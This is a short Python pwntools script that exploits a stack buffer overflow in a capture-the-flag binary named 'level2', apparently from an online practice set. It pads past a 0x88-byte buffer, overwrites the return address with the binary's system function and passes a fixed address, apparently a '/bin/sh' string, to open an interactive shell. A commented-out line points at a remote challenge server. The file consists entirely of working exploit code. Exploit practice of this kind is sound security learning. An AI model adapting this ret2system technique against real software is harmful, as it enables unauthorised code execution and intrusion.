from pwn import *
p = process("./level2")
#p = remote("111.198.29.45",35662)
context.log_level = 'debug'
# context.terminal = ['tmux','splitw','-h']

elf = ELF("./level2")
# obj = LibcSearcher("",)

# gdb.attach(p)
system = elf.symbols['system']
payload = "a"*(0x88+4) + p32(system)+ p32(0xdeadbeef) + p32(0x0804a024)

p.send(payload)
p.interactive()
